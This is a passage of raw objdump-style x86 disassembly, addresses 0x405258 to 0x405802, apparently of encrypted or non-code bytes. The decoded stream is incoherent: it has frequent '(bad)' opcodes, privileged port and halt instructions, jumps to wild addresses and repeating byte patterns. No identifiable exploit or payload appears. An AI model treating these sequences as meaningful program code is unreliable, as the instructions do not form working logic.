  405258:	8e cd                	mov    %ebp,%cs
  40525a:	f9                   	stc
  40525b:	9d                   	popf
  40525c:	c9                   	leave
  40525d:	3d f9 36 4c d1       	cmp    $0xd14c36f9,%eax
  405262:	e1 02                	loope  0x405266
  405264:	b8 5c 0e 8c 3d       	mov    $0x3d8c0e5c,%eax
  405269:	0c c1                	or     $0xc1,%al
  40526b:	33 76 dc             	xor    -0x24(%esi),%esi
  40526e:	ca ce 87             	lret   $0x87ce
  405271:	89 c9                	mov    %ecx,%ecx
  405273:	70 4b                	jo     0x4052c0
  405275:	54                   	push   %esp
  405276:	03 57 c0             	add    -0x40(%edi),%edx
  405279:	d7                   	xlat   %ds:(%ebx)
  40527a:	eb 11                	jmp    0x40528d
  40527c:	ee                   	out    %al,(%dx)
  40527d:	10 a4 28 00 b6 56 3c 	adc    %ah,0x3c56b600(%eax,%ebp,1)
  405284:	21 7c dc d8          	and    %edi,-0x28(%esp,%ebx,8)
  405288:	c9                   	leave
  405289:	53                   	push   %ebx
  40528a:	9c                   	pushf
  40528b:	d3 1a                	rcrl   %cl,(%edx)
  40528d:	f3 15 f1 b3 e0 a3    	repz adc $0xa3e0b3f1,%eax
  405293:	53                   	push   %ebx
  405294:	af                   	scas   %es:(%edi),%eax
  405295:	e0 cb                	loopne 0x405262
  405297:	22 7a 05             	and    0x5(%edx),%bh
  40529a:	b7 4a                	mov    $0x4a,%bh
  40529c:	7e eb                	jle    0x405289
  40529e:	53                   	push   %ebx
  40529f:	1f                   	pop    %ds
  4052a0:	a8 9e                	test   $0x9e,%al
  4052a2:	78 2e                	js     0x4052d2
  4052a4:	11 d6                	adc    %edx,%esi
  4052a6:	67 5f                	addr16 pop %edi
  4052a8:	76 3d                	jbe    0x4052e7
  4052aa:	c4 34 34             	les    (%esp,%esi,1),%esi
  4052ad:	53                   	push   %ebx
  4052ae:	d8 65 a9             	fsubs  -0x57(%ebp)
  4052b1:	de 0d a0 d6 b1 87    	fimuls 0x87b1d6a0
  4052b7:	ef                   	out    %eax,(%dx)
  4052b8:	5e                   	pop    %esi
  4052b9:	5a                   	pop    %edx
  4052ba:	a9 85 db dd c6       	test   $0xc6dddb85,%eax
  4052bf:	3a 50 00             	cmp    0x0(%eax),%dl
  4052c2:	2d 25 98 00 73       	sub    $0x73009825,%eax
  4052c7:	d0 62 fa             	shlb   $1,-0x6(%edx)
  4052ca:	d9 23                	fldenv (%ebx)
  4052cc:	f3 eb cc             	repz jmp 0x40529b
  4052cf:	48                   	dec    %eax
  4052d0:	7d 77                	jge    0x405349
  4052d2:	02 90 f5 63 f2 e8    	add    -0x170d9c0b(%eax),%dl
  4052d8:	50                   	push   %eax
  4052d9:	fc                   	cld
  4052da:	4d                   	dec    %ebp
  4052db:	c6                   	(bad)
  4052dc:	c9                   	leave
  4052dd:	cf                   	iret
  4052de:	90                   	nop
  4052df:	7d 56                	jge    0x405337
  4052e1:	27                   	daa
  4052e2:	7b ea                	jnp    0x4052ce
  4052e4:	0e                   	push   %cs
  4052e5:	3b 46 6f             	cmp    0x6f(%esi),%eax
  4052e8:	e9 3a 61 8e d4       	jmp    0xd4ceb427
  4052ed:	f6 df                	neg    %bh
  4052ef:	96                   	xchg   %eax,%esi
  4052f0:	e0 64                	loopne 0x405356
  4052f2:	78 f2                	js     0x4052e6
  4052f4:	0e                   	push   %cs
  4052f5:	44                   	inc    %esp
  4052f6:	d8 2a                	fsubrs (%edx)
  4052f8:	55                   	push   %ebp
  4052f9:	f4                   	hlt
  4052fa:	07                   	pop    %es
  4052fb:	95                   	xchg   %eax,%ebp
  4052fc:	e4 6e                	in     $0x6e,%al
  4052fe:	0c cd                	or     $0xcd,%al
  405300:	c2 e3 ea             	ret    $0xeae3
  405303:	2d fa 42 ac ef       	sub    $0xefac42fa,%eax
  405308:	35 18 e0 63 03       	xor    $0x363e018,%eax
  40530d:	53                   	push   %ebx
  40530e:	d9 f8                	fprem
  405310:	29 0b                	sub    %ecx,(%ebx)
  405312:	7c d2                	jl     0x4052e6
  405314:	f5                   	cmc
  405315:	ea 87 10 b3 bc eb a9 	ljmp   $0xa9eb,$0xbcb31087
  40531c:	c2 2f 56             	ret    $0x562f
  40531f:	6f                   	outsl  %ds:(%esi),(%dx)
  405320:	51                   	push   %ecx
  405321:	ed                   	in     (%dx),%eax
  405322:	fc                   	cld
  405323:	f9                   	stc
  405324:	e7 7f                	out    %eax,$0x7f
  405326:	02 2d 6d ac e6 e4    	add    0xe4e6ac6d,%ch
  40532c:	c8 b8 a0 0b          	enter  $0xa0b8,$0xb
  405330:	b6 4f                	mov    $0x4f,%dh
  405332:	1c a7                	sbb    $0xa7,%al
  405334:	0a f5                	or     %ch,%dh
  405336:	f4                   	hlt
  405337:	ad                   	lods   %ds:(%esi),%eax
  405338:	f6 69 46             	imulb  0x46(%ecx)
  40533b:	5a                   	pop    %edx
  40533c:	d5 46                	aad    $0x46
  40533e:	ae                   	scas   %es:(%edi),%al
  40533f:	54                   	push   %esp
  405340:	ee                   	out    %al,(%dx)
  405341:	50                   	push   %eax
  405342:	fb                   	sti
  405343:	0d 25 ab 7c 96       	or     $0x967cab25,%eax
  405348:	dd 95 f5 bf 55 0c    	fstl   0xc55bff5(%ebp)
  40534e:	72 53                	jb     0x4053a3
  405350:	b4 38                	mov    $0x38,%ah
  405352:	2d cc 33 de a4       	sub    $0xa4de33cc,%eax
  405357:	ef                   	out    %eax,(%dx)
  405358:	fd                   	std
  405359:	40                   	inc    %eax
  40535a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40535b:	47                   	inc    %edi
  40535c:	0c a7                	or     $0xa7,%al
  40535e:	43                   	inc    %ebx
  40535f:	ea 9c aa 42 5a 74 41 	ljmp   $0x4174,$0x5a42aa9c
  405366:	bb db b9 98 da       	mov    $0xda98b9db,%ebx
  40536b:	20 8d e2 2a 34 07    	and    %cl,0x7342ae2(%ebp)
  405371:	de 18                	ficomps (%eax)
  405373:	f8                   	clc
  405374:	31 25 a2 74 e9 dc    	xor    %esp,0xdce974a2
  40537a:	75 1b                	jne    0x405397
  40537c:	2e 29 3f             	sub    %edi,%cs:(%edi)
  40537f:	b1 9b                	mov    $0x9b,%cl
  405381:	e3 18                	jecxz  0x40539b
  405383:	24 32                	and    $0x32,%al
  405385:	95                   	xchg   %eax,%ebp
  405386:	64 24 04             	fs and $0x4,%al
  405389:	16                   	push   %ss
  40538a:	b1 d4                	mov    $0xd4,%cl
  40538c:	85 98 02 f9 ee 57    	test   %ebx,0x57eef902(%eax)
  405392:	46                   	inc    %esi
  405393:	60                   	pusha
  405394:	82 17 1b             	adcb   $0x1b,(%edi)
  405397:	2d cd 86 a5 a8       	sub    $0xa8a586cd,%eax
  40539c:	fd                   	std
  40539d:	c3                   	ret
  40539e:	e4 be                	in     $0xbe,%al
  4053a0:	58                   	pop    %eax
  4053a1:	fa                   	cli
  4053a2:	05 e9 4d a0 56       	add    $0x56a04de9,%eax
  4053a7:	0c 72                	or     $0x72,%al
  4053a9:	53                   	push   %ebx
  4053aa:	e2 2c                	loop   0x4053d8
  4053ac:	7c 07                	jl     0x4053b5
  4053ae:	af                   	scas   %es:(%edi),%eax
  4053af:	72 43                	jb     0x4053f4
  4053b1:	c7 44 b8 21 71 ad 69 	movl   $0xc69ad71,0x21(%eax,%edi,4)
  4053b8:	0c 
  4053b9:	72 53                	jb     0x40540e
  4053bb:	ee                   	out    %al,(%dx)
  4053bc:	6b cf 1f             	imul   $0x1f,%edi,%ecx
  4053bf:	1b 47 3f             	sbb    0x3f(%edi),%eax
  4053c2:	91                   	xchg   %eax,%ecx
  4053c3:	2b b2 b3 94 84 49    	sub    0x498494b3(%edx),%esi
  4053c9:	ed                   	in     (%dx),%eax
  4053ca:	c5 fb d5             	(bad)
  4053cd:	fb                   	sti
  4053ce:	f1                   	int1
  4053cf:	d4 b5                	aam    $0xb5
  4053d1:	1f                   	pop    %ds
  4053d2:	35 53 81 ba 67       	xor    $0x67ba8153,%eax
  4053d7:	97                   	xchg   %eax,%edi
  4053d8:	9c                   	pushf
  4053d9:	0d 72 53 26 6f       	or     $0x6f265372,%eax
  4053de:	7d 02                	jge    0x4053e2
  4053e0:	43                   	inc    %ebx
  4053e1:	6c                   	insb   (%dx),%es:(%edi)
  4053e2:	a8 25                	test   $0x25,%al
  4053e4:	00 25 a0 8a a4 47    	add    %ah,0x47a48aa0
  4053ea:	6d                   	insl   (%dx),%es:(%edi)
  4053eb:	61                   	popa
  4053ec:	a9 ab 0d 72 53       	test   $0x53720dab,%eax
  4053f1:	50                   	push   %eax
  4053f2:	86 f3                	xchg   %dh,%bl
  4053f4:	28 31                	sub    %dh,(%ecx)
  4053f6:	6d                   	insl   (%dx),%es:(%edi)
  4053f7:	af                   	scas   %es:(%edi),%eax
  4053f8:	89 63 bd             	mov    %esp,-0x43(%ebx)
  4053fb:	0c 97                	or     $0x97,%al
  4053fd:	64 92                	fs xchg %eax,%edx
  4053ff:	fc                   	cld
  405400:	b9 e3 b5 0d 72       	mov    $0x720db5e3,%ecx
  405405:	53                   	push   %ebx
  405406:	99                   	cltd
  405407:	d2 a8 e5 a4 9a 97    	shrb   %cl,-0x68655b1b(%eax)
  40540d:	45                   	inc    %ebp
  40540e:	0f b9 31             	ud1    (%ecx),%esi
  405411:	6d                   	insl   (%dx),%es:(%edi)
  405412:	a9 05 0e eb 79       	test   $0x79eb0e05,%eax
  405417:	0c 72                	or     $0x72,%al
  405419:	13 af 4f 11 f8 08    	adc    0x8f8114f(%edi),%ebp
  40541f:	21 49 59             	and    %ecx,0x59(%ecx)
  405422:	82 1f 22             	sbbb   $0x22,(%edi)
  405425:	2a 53 0d             	sub    0xd(%ebx),%dl
  405428:	0f 2a 97 d4 80 3c f9 	cvtpi2ps -0x6c37f2c(%edi),%xmm2
  40542f:	1d d1 dd 81 cd       	sbb    $0xcd81ddd1,%eax
  405434:	7a 3a                	jp     0x405470
  405436:	e9 58 8e 56 d5       	jmp    0xd596e293
  40543b:	e3 1e                	jecxz  0x40545b
  40543d:	fb                   	sti
  40543e:	ee                   	out    %al,(%dx)
  40543f:	19 c5                	sbb    %eax,%ebp
  405441:	14 5e                	adc    $0x5e,%al
  405443:	d4 54                	aam    $0x54
  405445:	5e                   	pop    %esi
  405446:	6f                   	outsl  %ds:(%esi),(%dx)
  405447:	62 eb f2             	(bad) {%k7}
  40544a:	67 ef                	addr16 out %eax,(%dx)
  40544c:	d8 4c 23 da          	fmuls  -0x26(%ebx,%eiz,1)
  405450:	d0 d2                	rcl    $1,%dl
  405452:	5e                   	pop    %esi
  405453:	e5 a9                	in     $0xa9,%eax
  405455:	f5                   	cmc
  405456:	bb f9 01 a7 a6       	mov    $0xa6a701f9,%ebx
  40545b:	6d                   	insl   (%dx),%es:(%edi)
  40545c:	66 49                	dec    %cx
  40545e:	2e 5c                	cs pop %esp
  405460:	16                   	push   %ss
  405461:	96                   	xchg   %eax,%esi
  405462:	2a c1                	sub    %cl,%al
  405464:	47                   	inc    %edi
  405465:	56                   	push   %esi
  405466:	c6                   	(bad)
  405467:	98                   	cwtl
  405468:	5d                   	pop    %ebp
  405469:	8f                   	(bad)
  40546a:	f5                   	cmc
  40546b:	be 4e 60 3e 74       	mov    $0x743e604e,%esi
  405470:	e9 bf 8f 50 97       	jmp    0x9790e434
  405475:	a9 46 1f 42 7c       	test   $0x7c421f46,%eax
  40547a:	0d 9c 0e b3 35       	or     $0x35b30e9c,%eax
  40547f:	ea 80 fb 57 63 98 1b 	ljmp   $0x1b98,$0x6357fb80
  405486:	ec                   	in     (%dx),%al
  405487:	61                   	popa
  405488:	a9 28 ed 6e 82       	test   $0x826eed28,%eax
  40548d:	cf                   	iret
  40548e:	93                   	xchg   %eax,%ebx
  40548f:	56                   	push   %esi
  405490:	0a ba dc 8f 3c 09    	or     0x93c8fdc(%edx),%bh
  405496:	d9 ab 9b c9 23 22    	fldcw  0x2223c99b(%ebx)
  40549c:	df b3 86 29 98 e9    	fbstp  -0x1667d67a(%ebx)
  4054a2:	9a 06 8c 4a 47 f8 95 	lcall  $0x95f8,$0x474a8c06
  4054a9:	07                   	pop    %es
  4054aa:	a9 0d 13 60 7d       	test   $0x7d60130d,%eax
  4054af:	fb                   	sti
  4054b0:	31 b0 29 62 0e dd    	xor    %esi,-0x22f19dd7(%eax)
  4054b6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4054b7:	eb fa                	jmp    0x4054b3
  4054b9:	09 15 8b 21 39 78    	or     %edx,0x7839218b
  4054bf:	86 e2                	xchg   %ah,%dl
  4054c1:	ab                   	stos   %eax,%es:(%edi)
  4054c2:	d6                   	salc
  4054c3:	91                   	xchg   %eax,%ecx
  4054c4:	fa                   	cli
  4054c5:	50                   	push   %eax
  4054c6:	fa                   	cli
  4054c7:	d4 6c                	aam    $0x6c
  4054c9:	28 6f b7             	sub    %ch,-0x49(%edi)
  4054cc:	f4                   	hlt
  4054cd:	54                   	push   %esp
  4054ce:	c1 6a 15 08          	shrl   $0x8,0x15(%edx)
  4054d2:	1c b0                	sbb    $0xb0,%al
  4054d4:	79 27                	jns    0x4054fd
  4054d6:	2c f0                	sub    $0xf0,%al
  4054d8:	ad                   	lods   %ds:(%esi),%eax
  4054d9:	f1                   	int1
  4054da:	07                   	pop    %es
  4054db:	e0 e5                	loopne 0x4054c2
  4054dd:	73 ac                	jae    0x40548b
  4054df:	b8 f3 ae 3f 4c       	mov    $0x4c3faef3,%eax
  4054e4:	a8 f8                	test   $0xf8,%al
  4054e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4054e7:	65 30 be 9b 47 3e 23 	xor    %bh,%gs:0x233e479b(%esi)
  4054ee:	79 fe                	jns    0x4054ee
  4054f0:	20 93 80 6a 03 6e    	and    %dl,0x6e036a80(%ebx)
  4054f6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4054f7:	54                   	push   %esp
  4054f8:	c7 b8 e3 9b b6       	xbegin 0xb6dc38b5,(bad)
  4054fd:	c2 5a 42             	ret    $0x425a
  405500:	30 68 38             	xor    %ch,0x38(%eax)
  405503:	43                   	inc    %ebx
  405504:	36 a2 c1 d0 a2 bb    	mov    %al,%ss:0xbba2d0c1
  40550a:	55                   	push   %ebp
  40550b:	c4 aa a6 e0 f4 3d    	les    0x3df4e0a6(%edx),%ebp
  405511:	e1 cc                	loope  0x4054df
  405513:	75 04                	jne    0x405519
  405515:	87 61 85             	xchg   %esp,-0x7b(%ecx)
  405518:	c3                   	ret
  405519:	48                   	dec    %eax
  40551a:	aa                   	stos   %al,%es:(%edi)
  40551b:	ed                   	in     (%dx),%eax
  40551c:	11 06                	adc    %eax,(%esi)
  40551e:	fa                   	cli
  40551f:	dd ce                	(bad)
  405521:	68 0c 45 68 e2       	push   $0xe268450c
  405526:	df ca                	(bad)
  405528:	b8 80 b6 23 8e       	mov    $0x8e23b680,%eax
  40552d:	f2 ea ed 2b 52 ab 94 	repnz ljmp $0x9394,$0xab522bed
  405534:	93 
  405535:	17                   	pop    %ss
  405536:	31 c4                	xor    %eax,%esp
  405538:	b5 da                	mov    $0xda,%ch
  40553a:	4f                   	dec    %edi
  40553b:	1f                   	pop    %ds
  40553c:	d3 c5                	rol    %cl,%ebp
  40553e:	db 75 ba             	(bad) -0x46(%ebp)
  405541:	74 6b                	je     0x4055ae
  405543:	5d                   	pop    %ebp
  405544:	2a 2b                	sub    (%ebx),%ch
  405546:	f2 25 25 34 68 ca    	repnz and $0xca683425,%eax
  40554c:	32 40 f1             	xor    -0xf(%eax),%al
  40554f:	ad                   	lods   %ds:(%esi),%eax
  405550:	c5 4c 43 9b          	lds    -0x65(%ebx,%eax,2),%ecx
  405554:	85 b8 18 7b 30 15    	test   %edi,0x15307b18(%eax)
  40555a:	4b                   	dec    %ebx
  40555b:	c5 ae ae f5 a2 9b    	lds    -0x645d0a52(%esi),%ebp
  405561:	49                   	dec    %ecx
  405562:	71 e2                	jno    0x405546
  405564:	d5 08                	aad    $0x8
  405566:	ad                   	lods   %ds:(%esi),%eax
  405567:	2d 39 c0 e2 af       	sub    $0xafe2c039,%eax
  40556c:	09 4a 9a             	or     %ecx,-0x66(%edx)
  40556f:	e9 d8 d5 c1 62       	jmp    0x63022b4c
  405574:	00 77 13             	add    %dh,0x13(%edi)
  405577:	2c 43                	sub    $0x43,%al
  405579:	7c 61                	jl     0x4055dc
  40557b:	50                   	push   %eax
  40557c:	d9 89 23 98 13 ba    	(bad) -0x45ec67dd(%ecx)
  405582:	d4 c5                	aam    $0xc5
  405584:	b6 bd                	mov    $0xbd,%dh
  405586:	64 9d                	fs popf
  405588:	19 34 ad 87 23 39 43 	sbb    %esi,0x43392387(,%ebp,4)
  40558f:	5a                   	pop    %edx
  405590:	95                   	xchg   %eax,%ebp
  405591:	11 dd                	adc    %ebx,%ebp
  405593:	1b 0a                	sbb    (%edx),%ecx
  405595:	47                   	inc    %edi
  405596:	0f 63 4c 76 75       	packsswb 0x75(%esi,%esi,2),%mm1
  40559b:	d7                   	xlat   %ds:(%ebx)
  40559c:	fc                   	cld
  40559d:	e4 33                	in     $0x33,%al
  40559f:	53                   	push   %ebx
  4055a0:	74 92                	je     0x405534
  4055a2:	d6                   	salc
  4055a3:	92                   	xchg   %eax,%edx
  4055a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055a5:	0a 4c fe 4d          	or     0x4d(%esi,%edi,8),%cl
  4055a9:	50                   	push   %eax
  4055aa:	34 ad                	xor    $0xad,%al
  4055ac:	f7 19                	negl   (%ecx)
  4055ae:	3a cb                	cmp    %bl,%cl
  4055b0:	d4 62                	aam    $0x62
  4055b2:	81 66 74 dc 93 8d de 	andl   $0xde8d93dc,0x74(%esi)
  4055b9:	ab                   	stos   %eax,%es:(%edi)
  4055ba:	cd 32                	int    $0x32
  4055bc:	2d 58 25 da e2       	sub    $0xe2da2558,%eax
  4055c1:	98                   	cwtl
  4055c2:	55                   	push   %ebp
  4055c3:	4f                   	dec    %edi
  4055c4:	1d bc 65 c5 d6       	sbb    $0xd6c565bc,%eax
  4055c9:	ad                   	lods   %ds:(%esi),%eax
  4055ca:	36 96                	ss xchg %eax,%esi
  4055cc:	7f ab                	jg     0x405579
  4055ce:	14 ef                	adc    $0xef,%al
  4055d0:	c7                   	(bad)
  4055d1:	d1 99 0f 72 53 09    	rcrl   $1,0x953720f(%ecx)
  4055d7:	c9                   	leave
  4055d8:	7f d6                	jg     0x4055b0
  4055da:	9b                   	fwait
  4055db:	b8 3b d8 0f e9       	mov    $0xe90fd83b,%eax
  4055e0:	17                   	pop    %ss
  4055e1:	74 e4                	je     0x4055c7
  4055e3:	9d                   	popf
  4055e4:	12 9d d1 53 7d 8a    	adc    -0x7582ac2f(%ebp),%bl
  4055ea:	a1 0f 72 53 bd       	mov    0xbd53720f,%eax
  4055ef:	c0 fb cd             	sar    $0xcd,%bl
  4055f2:	ab                   	stos   %eax,%es:(%edi)
  4055f3:	0f 72                	psrld  $0x72,(bad)
  4055f5:	53                   	push   %ebx
  4055f6:	c7 44 7e 84 ef c8 9b 	movl   $0xf9bc8ef,-0x7c(%esi,%edi,2)
  4055fd:	0f 
  4055fe:	72 53                	jb     0x405653
  405600:	60                   	pusha
  405601:	81 2b da 1d 89 44    	subl   $0x44891dda,(%ebx)
  405607:	08 88 c2 b8 a3 9f    	or     %cl,-0x605c473e(%eax)
  40560d:	4f                   	dec    %edi
  40560e:	f9                   	stc
  40560f:	de d5                	(bad)
  405611:	61                   	popa
  405612:	bb 3c 1a c3 05       	mov    $0x5c31a3c,%ebx
  405617:	42                   	inc    %edx
  405618:	61                   	popa
  405619:	9b                   	fwait
  40561a:	41                   	inc    %ecx
  40561b:	39 4b 1c             	cmp    %ecx,0x1c(%ebx)
  40561e:	a3 0c 64 b4 2e       	mov    %eax,0x2eb4640c
  405623:	67 3c 40             	addr16 cmp $0x40,%al
  405626:	0b 0f                	or     (%edi),%ecx
  405628:	2c ff                	sub    $0xff,%al
  40562a:	17                   	pop    %ss
  40562b:	98                   	cwtl
  40562c:	f8                   	clc
  40562d:	24 70                	and    $0x70,%al
  40562f:	06                   	push   %es
  405630:	fe 0f                	decb   (%edi)
  405632:	72 53                	jb     0x405687
  405634:	bf 3f 93 50 fa       	mov    $0xfa50933f,%edi
  405639:	70 66                	jo     0x4056a1
  40563b:	d8 99 e6 f8 80 c0    	fcomps -0x3f7f071a(%ecx)
  405641:	19 1a                	sbb    %ebx,(%edx)
  405643:	43                   	inc    %ebx
  405644:	10 5a f1             	adc    %bl,-0xf(%edx)
  405647:	ce                   	into
  405648:	9a 4b 36 41 0f 72 53 	lcall  $0x5372,$0xf41364b
  40564f:	2b f7                	sub    %edi,%esi
  405651:	ad                   	lods   %ds:(%esi),%eax
  405652:	11 a3 8c ea 88 9b    	adc    %esp,-0x64771574(%ebx)
  405658:	dd 57 18             	fstl   0x18(%edi)
  40565b:	fc                   	cld
  40565c:	fd                   	std
  40565d:	34 a3                	xor    $0xa3,%al
  40565f:	6f                   	outsl  %ds:(%esi),(%dx)
  405660:	ef                   	out    %eax,(%dx)
  405661:	1c 2a                	sbb    $0x2a,%al
  405663:	a0 a5 d6 bd c0       	mov    0xc0bdd6a5,%al
  405668:	fd                   	std
  405669:	6e                   	outsb  %ds:(%esi),(%dx)
  40566a:	43                   	inc    %ebx
  40566b:	ea e4 c0 29 7f 11 a2 	ljmp   $0xa211,$0x7f29c0e4
  405672:	29 ca                	sub    %ecx,%edx
  405674:	e7 d2                	out    %eax,$0xd2
  405676:	6b 61 98 f0          	imul   $0xfffffff0,-0x68(%ecx),%esp
  40567a:	1d 66 9e 6a 4f       	sbb    $0x4f6a9e66,%eax
  40567f:	d3 e1                	shl    %cl,%ecx
  405681:	4b                   	dec    %ebx
  405682:	ce                   	into
  405683:	dc d4                	(bad)
  405685:	4c                   	dec    %esp
  405686:	ca 39 b1             	lret   $0xb139
  405689:	99                   	cltd
  40568a:	d0 49 8a             	rorb   $1,-0x76(%ecx)
  40568d:	1f                   	pop    %ds
  40568e:	88 57 63             	mov    %dl,0x63(%edi)
  405691:	0a 50 3d             	or     0x3d(%eax),%dl
  405694:	65 39 15 00 7e 0f 72 	cmp    %edx,%gs:0x720f7e00
  40569b:	53                   	push   %ebx
  40569c:	af                   	scas   %es:(%edi),%eax
  40569d:	44                   	inc    %esp
  40569e:	93                   	xchg   %eax,%ebx
  40569f:	53                   	push   %ebx
  4056a0:	f2 25 2e 7e 79 14    	repnz and $0x14797e2e,%eax
  4056a6:	1c fa                	sbb    $0xfa,%al
  4056a8:	bc 3d 9f 43 e0       	mov    $0xe0439f3d,%esp
  4056ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4056ae:	2e 67 58             	cs addr16 pop %eax
  4056b1:	2f                   	das
  4056b2:	fa                   	cli
  4056b3:	7f a6                	jg     0x40565b
  4056b5:	ae                   	scas   %es:(%edi),%al
  4056b6:	9d                   	popf
  4056b7:	d6                   	salc
  4056b8:	eb ee                	jmp    0x4056a8
  4056ba:	17                   	pop    %ss
  4056bb:	d1 3f                	sarl   $1,(%edi)
  4056bd:	ee                   	out    %al,(%dx)
  4056be:	5e                   	pop    %esi
  4056bf:	62 fa 25             	(bad) {rz-bad},{%k5}
  4056c2:	75 fe                	jne    0x4056c2
  4056c4:	60                   	pusha
  4056c5:	30 9b a4 a7 64 12    	xor    %bl,0x1264a7a4(%ebx)
  4056cb:	8b 00                	mov    (%eax),%eax
  4056cd:	72 53                	jb     0x405722
  4056cf:	55                   	push   %ebp
  4056d0:	f0 07                	lock pop %es
  4056d2:	e2 18                	loop   0x4056ec
  4056d4:	e6 24                	out    %al,$0x24
  4056d6:	7d 80                	jge    0x405658
  4056d8:	de 1f                	ficomps (%edi)
  4056da:	da d7                	fcmovbe %st(7),%st
  4056dc:	f1                   	int1
  4056dd:	41                   	inc    %ecx
  4056de:	96                   	xchg   %eax,%esi
  4056df:	00 72 53             	add    %dh,0x53(%edx)
  4056e2:	5d                   	pop    %ebp
  4056e3:	66 d3 78 d8          	sarw   %cl,-0x28(%eax)
  4056e7:	b0 00                	mov    $0x0,%al
  4056e9:	72 53                	jb     0x40573e
  4056eb:	87 bc 8c 9f c9 9e e9 	xchg   %edi,-0x16613661(%esp,%ecx,4)
  4056f2:	df c8                	(bad)
  4056f4:	7c aa                	jl     0x4056a0
  4056f6:	ef                   	out    %eax,(%dx)
  4056f7:	6d                   	insl   (%dx),%es:(%edi)
  4056f8:	28 34 14             	sub    %dh,(%esp,%edx,1)
  4056fb:	e0 88                	loopne 0x405685
  4056fd:	2c b2                	sub    $0xb2,%al
  4056ff:	ac                   	lods   %ds:(%esi),%al
  405700:	42                   	inc    %edx
  405701:	ba 00 72 53 c9       	mov    $0xc9537200,%edx
  405706:	c3                   	ret
  405707:	e6 78                	out    %al,$0x78
  405709:	28 14 c6             	sub    %dl,(%esi,%eax,8)
  40570c:	00 72 53             	add    %dh,0x53(%edx)
  40570f:	2f                   	das
  405710:	f5                   	cmc
  405711:	8d 32                	lea    (%edx),%esi
  405713:	ca 00 72             	lret   $0x7200
  405716:	53                   	push   %ebx
  405717:	40                   	inc    %eax
  405718:	79 99                	jns    0x4056b3
  40571a:	36 f6 05 1a 6f de 00 	testb  $0x72,%ss:0xde6f1a
  405721:	72 
  405722:	53                   	push   %ebx
  405723:	f5                   	cmc
  405724:	dd 00                	fldl   (%eax)
  405726:	c1 ac d0 4c 9d e2 00 	shrl   $0x72,0xe29d4c(%eax,%edx,8)
  40572d:	72 
  40572e:	53                   	push   %ebx
  40572f:	af                   	scas   %es:(%edi),%eax
  405730:	a8 a0                	test   $0xa0,%al
  405732:	57                   	push   %edi
  405733:	9f                   	lahf
  405734:	f5                   	cmc
  405735:	36 4a                	ss dec %edx
  405737:	f6 00 72             	testb  $0x72,(%eax)
  40573a:	53                   	push   %ebx
  40573b:	64 d6                	fs salc
  40573d:	57                   	push   %edi
  40573e:	3e ca 22 61          	ds lret $0x6122
  405742:	bb fa 00 72 53       	mov    $0x537200fa,%ebx
  405747:	32 41 81             	xor    -0x7f(%ecx),%al
  40574a:	5c                   	pop    %esp
  40574b:	11 13                	adc    %edx,(%ebx)
  40574d:	ad                   	lods   %ds:(%esi),%eax
  40574e:	60                   	pusha
  40574f:	0e                   	push   %cs
  405750:	00 72 53             	add    %dh,0x53(%edx)
  405753:	a0 67 2d 11 ca       	mov    0xca112d67,%al
  405758:	da a2 3d 12 00 72    	fisubl 0x7200123d(%edx)
  40575e:	53                   	push   %ebx
  40575f:	cd d6                	int    $0xd6
  405761:	35 f2 b1 a7 d2       	xor    $0xd2a7b1f2,%eax
  405766:	4b                   	dec    %ebx
  405767:	26 00 72 53          	add    %dh,%es:0x53(%edx)
  40576b:	f0 ae                	lock scas %es:(%edi),%al
  40576d:	65 1c af             	gs sbb $0xaf,%al
  405770:	7d 39                	jge    0x4057ab
  405772:	eb 26                	jmp    0x40579a
  405774:	00 72 53             	add    %dh,0x53(%edx)
  405777:	92                   	xchg   %eax,%edx
  405778:	35 0c d8 0e c9       	xor    $0xc90ed80c,%eax
  40577d:	ea 2c 0c 56 27 47 33 	ljmp   $0x3347,$0x27560c2c
  405784:	00 72 53             	add    %dh,0x53(%edx)
  405787:	5b                   	pop    %ebx
  405788:	cc                   	int3
  405789:	51                   	push   %ecx
  40578a:	15 cc 24 69 d7       	adc    $0xd76924cc,%eax
  40578f:	e8 35 c0 90 37       	call   0x37d117c9
  405794:	ee                   	out    %al,(%dx)
  405795:	78 40                	js     0x4057d7
  405797:	00 72 53             	add    %dh,0x53(%edx)
  40579a:	1c 40                	sbb    $0x40,%al
  40579c:	29 da                	sub    %ebx,%edx
  40579e:	f8                   	clc
  40579f:	f8                   	clc
  4057a0:	bd 47 e3 a5 02       	mov    $0x2a5e347,%ebp
  4057a5:	47                   	inc    %edi
  4057a6:	59                   	pop    %ecx
  4057a7:	ce                   	into
  4057a8:	2f                   	das
  4057a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4057aa:	00 72 53             	add    %dh,0x53(%edx)
  4057ad:	2c b7                	sub    $0xb7,%al
  4057af:	1f                   	pop    %ds
  4057b0:	00 e4                	add    %ah,%ah
  4057b2:	d8 a2 f3 e3 3d 43    	fsubs  0x433de3f3(%edx)
  4057b8:	86 2d 84 be 8e 24    	xchg   %ch,0x248ebe84
  4057be:	54                   	push   %esp
  4057bf:	00 72 53             	add    %dh,0x53(%edx)
  4057c2:	03 93 df 2b 15 8c    	add    -0x73ead421(%ebx),%edx
  4057c8:	1b 8b 7a e2 78 0f    	sbb    0xf78e27a(%ebx),%ecx
  4057ce:	cd 49                	int    $0x49
  4057d0:	50                   	push   %eax
  4057d1:	31 9a ff 7e 0f 14    	xor    %ebx,0x140f7eff(%edx)
  4057d7:	76 a1                	jbe    0x40577a
  4057d9:	c5 98 ef 42 1c 24    	lds    0x241c42ef(%eax),%ebx
  4057df:	a8 49                	test   $0x49,%al
  4057e1:	17                   	pop    %ss
  4057e2:	18 11                	sbb    %dl,(%ecx)
  4057e4:	d2 9e 01 72 53 1a    	rcrb   %cl,0x1a537201(%esi)
  4057ea:	59                   	pop    %ecx
  4057eb:	3d c9 12 54 ae       	cmp    $0xae5412c9,%eax
  4057f0:	01 72 53             	add    %esi,0x53(%edx)
  4057f3:	6d                   	insl   (%dx),%es:(%edi)
  4057f4:	ad                   	lods   %ds:(%esi),%eax
  4057f5:	7a 69                	jp     0x405860
  4057f7:	f2 ca 6f 13          	repnz lret $0x136f
  4057fb:	be 01 72 53 1e       	mov    $0x1e537201,%esi
  405800:	97                   	xchg   %eax,%edi
  405801:	c3                   	ret
  405802:	00 c9                	add    %cl,%cl
